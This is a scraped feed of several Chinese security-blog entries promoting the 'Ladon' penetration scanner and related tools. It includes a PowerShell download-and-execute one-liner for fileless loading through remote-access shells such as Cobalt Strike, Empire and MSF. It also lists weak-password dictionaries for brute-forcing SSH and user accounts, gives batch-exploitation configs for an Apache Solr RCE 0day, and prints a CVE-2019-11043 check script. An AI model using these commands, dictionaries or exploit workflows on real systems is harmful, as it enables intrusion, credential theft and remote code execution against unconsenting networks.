<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
<thead>
<tr>
<th>ID</th>
<th>主题</th>
<th>URL</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Ladon文档主页</td>
<td><a href="https://github.com/k8gege/Ladon/wiki" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki</a><br></td>
</tr>
<tr>
<td>2</td>
<td>基础用法详解</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a><br></td>
</tr>
<tr>
<td>3</td>
<td>Cobalt Strike</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike</a><br></td>
</tr>
<tr>
<td>4</td>
<td>Exp生成器使用</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
</tr>
<tr>
<td>5</td>
<td>高度自定义插件</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
</tr>
<tr>
<td>6</td>
<td>外部模块参考</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td>
</tr>
<tr>
<td>7</td>
<td>PowerLadon</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell</a></td>
</tr>
<tr>
<td>8</td>
<td>PythonLadon</td>
<td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td>
</tr>
<tr>
<td>9</td>
<td>LinuxLadon</td>
<td><a href="https://github.com/k8gege/LinuxLadon" target="_blank" rel="noopener">https://github.com/k8gege/LinuxLadon</a></td>
</tr>
<tr>
<td>10</td>
<td>漏洞演示视频</td>
<td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
</tr>
</tbody></table>
<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br><br>PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br><br>Ladon.ps1脚本由EXE转换而成，具备EXE版所有功能,相关功能使用请查看Ladon说明文档。<br></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>最新版本 <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><br>历史版本 <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br></p>
<h4 id="0x001-PowerShell本地加载"><a href="#0x001-PowerShell本地加载" class="headerlink" title="0x001 PowerShell本地加载"></a>0x001 PowerShell本地加载<br></h4><p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure>
<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
<h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure>
<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p>
<h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p>
<h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p>
<h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p>
<h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p>
<h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_msf.PNG"></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
        <category>PowerShell</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>2011-2019年Top100弱口令密码字典</title>
    <url>/p/16172.html</url>
    <content><![CDATA[<h3 id="2019年最差密码123456"><a href="#2019年最差密码123456" class="headerlink" title="2019年最差密码123456"></a>2019年最差密码123456</h3><p>近日，在评估网上泄漏的500万个密码后，密码管理公司SplashData发布了2019年度最糟糕密码榜单，123456连续两年蝉联冠军，根据统计共有超过281万人使用；第二名的123456，统计共有超过248万人使用；第三名的123456789，统计共有超过105万人使用，1990、1991、1992也在榜上。</p>
<p>据了解，SplashData公布的最差密码100强，是从密码管理服务SplashID、TeaMSID、Gpass收集得来。除了数字之外，还有“qwerty”、“password”等。</p>
<p>观察前200名安全性最差的常用密码排行榜单，之所以很容易被窃取盗用，其共同特色就是很容易被猜到，烂密码可以归纳为5大类：使用简易数字组合（如12345）；键盘垂直或水平排列组合（如qwerty、1qaz2wsx）；体育相关单词；姓名相关和与食物相关的单词。</p>
<p>看看你的密码在里面吗？</p>
<h3 id="国外网民密码2011-2018"><a href="#国外网民密码2011-2018" class="headerlink" title="国外网民密码2011-2018"></a>国外网民密码2011-2018</h3><p><img alt data-original="http://k8gege.org/k8img/Other/top2011_2018.PNG"></p>
<h3 id="国外网民密码2019"><a href="#国外网民密码2019" class="headerlink" title="国外网民密码2019"></a>国外网民密码2019</h3><p>123456<br>12345679<br>qwerty<br>12345678<br>111111<br>1234567890<br>1234567<br>password<br>123123<br>987654321<br>qwertyuiop<br>mynoob<br>123321<br>666666<br>18atcskd2w<br>7777777<br>1q2w3e4r<br>654321<br>555555<br>3rjs1la7qe<br>google<br>1q2w3e4r5t<br>123qwe<br>zxcvbnm<br>1q2w3e</p>
<h3 id="服务器SSH-VPS密码Top100"><a href="#服务器SSH-VPS密码Top100" class="headerlink" title="服务器SSH/VPS密码Top100"></a>服务器SSH/VPS密码Top100</h3><p>PublishThisListPlease<br>root<br>!@<br>wubao<br>password<br>123456<br>admin<br>12345<br>1234<br>p@ssw0rd<br>123<br>1<br>jiamima<br>test<br>root123<br>!<br>!q@w<br>!qaz@wsx<br>idc!@<br>admin!@</p>
<p>alpine<br>qwerty<br>12345678<br>111111<br>123456789<br>1q2w3e4r<br>123123<br>default<br>1234567<br>qwe123<br>1qaz2wsx<br>1234567890<br>abcd1234<br>000000<br>user<br>toor<br>qwer1234<br>1q2w3e<br>asdf1234<br>redhat<br>1234qwer<br>cisco<br>12qwaszx<br>test123<br>1q2w3e4r5t<br>admin123<br>changeme<br>1qazxsw2<br>123qweasd<br>q1w2e3r4<br>letmein<br>server<br>root1234<br>master<br>abc123<br>rootroot<br>a<br>system<br>pass<br>1qaz2wsx3edc<br>p@$$w0rd<br>112233<br>welcome<br>!QAZ2wsx<br>linux<br>123321<br>manager<br>1qazXSW@<br>q1w2e3r4t5<br>oracle<br>asd123<br>admin123456<br>ubnt<br>123qwe<br>qazwsxedc<br>administrator<br>superuser<br>zaq12wsx<br>121212<br>654321<br>ubuntu<br>0000<br>zxcvbnm<br>root@123<br>1111<br>vmware<br>q1w2e3<br>qwerty123<br>cisco123<br>11111111<br>pa55w0rd<br>asdfgh<br>11111<br>123abc<br>asdf<br>centos<br>888888<br>54321<br>password123</p>
<h3 id="中国网民密码Top100"><a href="#中国网民密码Top100" class="headerlink" title="中国网民密码Top100"></a>中国网民密码Top100</h3><p>123456789<br>a123456<br>123456<br>a123456789<br>1234567890<br>woaini1314<br>qq123456<br>abc123456<br>123456a<br>123456789a<br>147258369<br>zxcvbnm<br>987654321<br>12345678910<br>abc123<br>qq123456789<br>123456789.<br>7708801314520<br>woaini<br>5201314520<br>q123456<br>123456abc<br>1233211234567<br>123123123<br>123456.<br>0123456789<br>asd123456<br>aa123456<br>135792468<br>q123456789<br>abcd123456<br>12345678900<br>woaini520<br>woaini123<br>zxcvbnm123<br>1111111111111111<br>w123456<br>aini1314<br>abc123456789<br>111111<br>woaini521<br>qwertyuiop<br>1314520520<br>1234567891<br>qwe123456<br>asd123<br>000000<br>1472583690<br>1357924680<br>789456123<br>123456789abc<br>z123456<br>1234567899<br>aaa123456<br>abcd1234<br>www123456<br>123456789q<br>123abc<br>qwe123<br>w123456789<br>7894561230<br>123456qq<br>zxc123456<br>123456789qq<br>1111111111<br>111111111<br>0000000000000000<br>1234567891234567<br>qazwsxedc<br>qwerty<br>123456..<br>zxc123<br>asdfghjkl<br>0000000000<br>1234554321<br>123456q<br>123456aa<br>9876543210<br>110120119<br>qaz123456<br>qq5201314<br>123698745<br>5201314<br>000000000<br>as123456<br>123123<br>5841314520<br>z123456789<br>52013145201314<br>a123123<br>caonima<br>a5201314<br>wang123456<br>abcd123<br>123456789..<br>woaini1314520<br>123456asd<br>aa123456789<br>741852963<br>a12345678</p>
<h3 id="越南网民密码Top100"><a href="#越南网民密码Top100" class="headerlink" title="越南网民密码Top100"></a>越南网民密码Top100</h3><p>123456<br>123456789<br>123123<br>111111<br>anhyeuem<br>1234567<br>123456789<br>123456<br>12345678<br>000000<br>asdasd<br>25251325<br>1234567890<br>121212<br>123321<br>zxcvbnm<br>qweqwe<br>456789<br>112233<br>aaaaaa<br>123123123<br>987654321<br>11111111<br>qwerty<br>147258369<br>maiyeuem<br>123qwe<br>654321<br>iloveyou<br>123654<br>999999<br>qqqqqq<br>1111111<br>147258<br>hota407<br>anhtuan<br>222222<br>159753<br>11223344<br>anhnhoem<br>anh123<br>159357<br>qwertyuiop<br>asd123<br>987654321<br>emyeuanh<br>mmmmmm<br>12345<br>666666<br>anhanh<br>123789<br>phuong<br>111222<br>qweasd<br>hanoiyeudau<br>nguyen<br>789456<br>1111111111<br>mylove<br>789456123<br>19001560<br>qwe123<br>asdfghjkl<br>pppppp<br>anhhung<br>1234560<br>abc123<br>maiyeu<br>123456a<br>zzzzzz<br>quangninh<br>987654<br>555555<br>tuananh<br>asasas<br>asdfgh<br>zxcvbn<br>321321<br>tinhyeu<br>147852369<br>456123<br>matkhau<br>147852<br>12345678910<br>thienthan<br>anhyeu<br>111111111<br>toilatoi<br>10cham0<br>147258369<br>456456<br>khongbiet<br>789789<br>a123456<br>333333<br>888888<br>123654789<br>truong<br>maimaiyeuem<br>hhhhhh</p>
<h3 id="完整字典下载"><a href="#完整字典下载" class="headerlink" title="完整字典下载"></a>完整字典下载</h3><p><a href="https://github.com/k8gege/PasswordDic" target="_blank" rel="noopener">https://github.com/k8gege/PasswordDic</a></p>
]]></content>
      <categories>
        <category>密码</category>
      </categories>
      <tags>
        <tag>Brute</tag>
        <tag>Password</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Solr &lt;=8.2.0 Velocity Template 0day Exploit</title>
    <url>/p/61341.html</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>下载Solr 8.2.0添加core,默认配置即可。7.x版本自带core</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>0x001 批量URL配置Cscan.ini<br><br>[Cscan]<br><br>exe=F:\Python279\python.exe<br><br>arg=exp.py $ip$ whoami<br><br>0x002 批量C段配置Cscan.ini<br><br>[Cscan]<br><br>exe=F:\Python279\python.exe<br><br>arg=exp.py http://$ip$:8983 whoami<br></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>单个: python exp.py url cmd<br> 或 Cscan url<br><br>批量C段: Cscan 192.168.1.8/24<br><br>批量URL: Cscan (同目录放url.txt)</p>
<img data-original="https://raw.githubusercontent.com/k8gege/SolrExp/master/Solr0day.gif">

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Exp: <a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">https://github.com/k8gege/SolrExp</a><br>Cscan: <a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>Solr</tag>
        <tag>Exp</tag>
        <tag>Ladon</tag>
        <tag>0day</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon POC CVE-2019-11043 PHP-FPM</title>
    <url>/p/41162.html</url>
    <content><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</p>
<p>在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时,服务返回异常,疑似存在漏洞。</p>
<p>在使用一些有错误的Nginx配置的情况下,通过恶意构造的数据包,即可让PHP-FPM执行任意代码。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>和Ladon.exe放在同一目录,即可对C段或url.txt进行批量检测</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon CVE-2019-11043_Poc.ini 批量URL检测(根目录下放url.txt)</span><br><span class="line">Ladon 192.168.1.37/24 CVE-2019-11043_Poc.ini 批量检测C段主机是否存在该漏洞</span><br><span class="line">Ladon http://192.168.1.37:8080/index.php CVE-2019-11043_Poc.ini 指定URL</span><br><span class="line">Ladon 5.5</span><br><span class="line">By K8gege</span><br><span class="line">Call AnyExe/Command</span><br><span class="line">http://192.168.1.37:8080/index.php</span><br><span class="line">load F:\Python279\python.exe</span><br><span class="line">ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span><br></pre></td></tr></table></figure>

<p><img alt data-original="https://raw.githubusercontent.com/k8gege/CVE-2019-11043/master/CVE-2019-11043-POC.PNG"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># Ladon POC by k8gege</span></span><br><span class="line"><span class="comment"># VUL: CVE-2019-11043 (PHP-FPM + Ngnix)</span></span><br><span class="line"><span class="comment"># url need include .php Example：http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2019-11043_POC.ini</span></span><br><span class="line"><span class="comment"># [Ladon]</span></span><br><span class="line"><span class="comment"># exe=F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># arg=POC\CVE-2019-11043-POC.py $ip$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="comment"># Ladon 192.168.1.37/24 poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"><span class="comment"># Ladon http://192.168.1.37:8080/index.php poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Result</span></span><br><span class="line"><span class="comment"># Ladon 5.5</span></span><br><span class="line"><span class="comment"># Call AnyExe/Command</span></span><br><span class="line"><span class="comment"># http://192.168.1.37:8080/index.php</span></span><br><span class="line"><span class="comment"># load F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkpoc</span><span class="params">(url)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0"</span>&#125;</span><br><span class="line">		res1 = requests.get(url, headers=headers)</span><br><span class="line">		<span class="keyword">if</span> res1.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"URL: "</span>+url</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1499</span>, <span class="number">1900</span>):</span><br><span class="line">				res = requests.get(url + <span class="string">"/PHP%0Ais_poc_thistiest_lang.php?"</span> + <span class="string">"K"</span> * i, headers=headers)</span><br><span class="line">				<span class="keyword">if</span> res.status_code == <span class="number">502</span>:</span><br><span class="line">					print(<span class="string">"ISVUL: CVE-2019-11043 "</span>+url)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">	  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">"http"</span> <span class="keyword">in</span> url:</span><br><span class="line">	checkpoc(url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	checkpoc(<span class="string">"http://"</span>+url+<span class="string">"/index.php"</span>)</span><br><span class="line">	checkpoc(<span class="string">"http://"</span>+url+<span class="string">":8080/index.php"</span>)</span><br><span class="line">checkpoc(<span class="string">"https://"</span>+url+<span class="string">"/index.php"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Poc</tag>
        <tag>PHP</tag>
        <tag>Code</tag>
        <tag>Ngnix</tag>
        <tag>CVE-2019-11043</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon for Kali 2019</title>
    <url>/p/dc4a2cb7.html</url>
    <content><![CDATA[<p><img alt="Ladon" data-original="http://k8gege.org/k8img/Ladon/Dragon.jpg"></p>
<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-5.8-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。</p>
<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
<h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Kali 2019.4 x64<br>Ubuntu 18.04 x64</p>
<h3 id="安装mono"><a href="#安装mono" class="headerlink" title="安装mono"></a>安装mono</h3><p>linux下需mono运行环境，Kali和Ubuntu安装命令通用。<br>其它系统未进行测试，喜欢用其它Linux系统自行测试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install mono-runtime</span><br></pre></td></tr></table></figure>

<h3 id="运行Ladon"><a href="#运行Ladon" class="headerlink" title="运行Ladon"></a>运行Ladon</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mono Ladon OnlinePC</span><br></pre></td></tr></table></figure>

<h3 id="可用功能"><a href="#可用功能" class="headerlink" title="可用功能"></a>可用功能</h3><p>由于mono的兼容性问题，不保证Linux下所有功能均可用<br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>测试发现有些功能的稳定性以及速度没有Windows系统快<br>未列功能系未测试或暂不可用功能，使用前请先看说明<br>在Kali 2019.4下测试，Ladon支持以下所列的27种功能<br>=============================================</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>WebDir</td>
<td>Web目录扫描</td>
</tr>
<tr>
<td>2</td>
<td>UrlScan</td>
<td>URL域名扫描（不验IP）</td>
</tr>
<tr>
<td>3</td>
<td>PhpStudyPoc</td>
<td>PhpStudy后门扫描</td>
</tr>
<tr>
<td>4</td>
<td>WebScan</td>
<td>Web信息扫描</td>
</tr>
<tr>
<td>5</td>
<td>MysqlScan</td>
<td>Mysql口令检测</td>
</tr>
<tr>
<td>6</td>
<td>OracleScan</td>
<td>Oracle口令检测</td>
</tr>
<tr>
<td>7</td>
<td>VncScan</td>
<td>Vnc口令检测</td>
</tr>
<tr>
<td>8</td>
<td>HttpDownLoad</td>
<td>Http下载</td>
</tr>
<tr>
<td>9</td>
<td>FtpDownLoad</td>
<td>Ftp下载</td>
</tr>
<tr>
<td>10</td>
<td>WhatCMS</td>
<td>75种CMS识别</td>
</tr>
<tr>
<td>11</td>
<td>FtpScan</td>
<td>Ftp口令检测</td>
</tr>
<tr>
<td>12</td>
<td>PortScan</td>
<td>PortScan端口扫描</td>
</tr>
<tr>
<td>13</td>
<td>SmbScan</td>
<td>Smb口令检测</td>
</tr>
<tr>
<td>14</td>
<td>SameWeb</td>
<td>站点域名扫描（验证IP）</td>
</tr>
<tr>
<td>15</td>
<td>MS17010</td>
<td>MS17010漏洞扫描</td>
</tr>
<tr>
<td>16</td>
<td>OnlinePC</td>
<td>存活主机扫描</td>
</tr>
<tr>
<td>17</td>
<td>OnlineIP</td>
<td>存活主机IP扫描</td>
</tr>
<tr>
<td>18</td>
<td>HostIP</td>
<td>主机名解析IP</td>
</tr>
<tr>
<td>19</td>
<td>DomainIP</td>
<td>子域名解析IP</td>
</tr>
<tr>
<td>20</td>
<td>EnBase64</td>
<td>批量Base64密码加密</td>
</tr>
<tr>
<td>21</td>
<td>DeBase64</td>
<td>批量Base64密码解密</td>
</tr>
<tr>
<td>22</td>
<td>EnHex</td>
<td>批量Hex密码加密</td>
</tr>
<tr>
<td>23</td>
<td>DeHex</td>
<td>批量Hex密码解密</td>
</tr>
<tr>
<td>24</td>
<td>OsScan</td>
<td>系统版本探测</td>
</tr>
<tr>
<td>25</td>
<td>SubDomain</td>
<td>子域名爆破</td>
</tr>
<tr>
<td>26</td>
<td>SshScan</td>
<td>SSH口令检测</td>
</tr>
<tr>
<td>27</td>
<td>*.ps1</td>
<td>无PowerShell执行脚本</td>
</tr>
</tbody></table>
<h3 id="暂不支持功能"><a href="#暂不支持功能" class="headerlink" title="暂不支持功能"></a>暂不支持功能</h3><p>=============================================<br>Struts2Poc  X不支持<br>TomcatScan X不支持<br>HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破<br>WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)<br>MssqlScan X不支持只能扫到开放端口<br>IpcScan X不支持(因为调用cmd命令)</p>
<h3 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p>
<h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_PortScan.gif"></p>
<h3 id="存活主机扫描"><a href="#存活主机扫描" class="headerlink" title="存活主机扫描"></a>存活主机扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_OnlinePC.gif"></p>
<h3 id="存活主机IP扫描"><a href="#存活主机IP扫描" class="headerlink" title="存活主机IP扫描"></a>存活主机IP扫描</h3><p>可能IP需要用于其它用途，故提供只输出IP功能<br><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_OnlineIP.gif"></p>
<h3 id="Ftp口令检测"><a href="#Ftp口令检测" class="headerlink" title="Ftp口令检测"></a>Ftp口令检测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_FtpScan.gif"></p>
<h3 id="Smb口令检测"><a href="#Smb口令检测" class="headerlink" title="Smb口令检测"></a>Smb口令检测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_SmbScan.gif"></p>
<h3 id="75种CMS识别"><a href="#75种CMS识别" class="headerlink" title="75种CMS识别"></a>75种CMS识别</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_WhatCMS.gif"></p>
<h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_SubDomain.gif"></p>
<h3 id="系统版本探测"><a href="#系统版本探测" class="headerlink" title="系统版本探测"></a>系统版本探测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_OsScan.gif"></p>
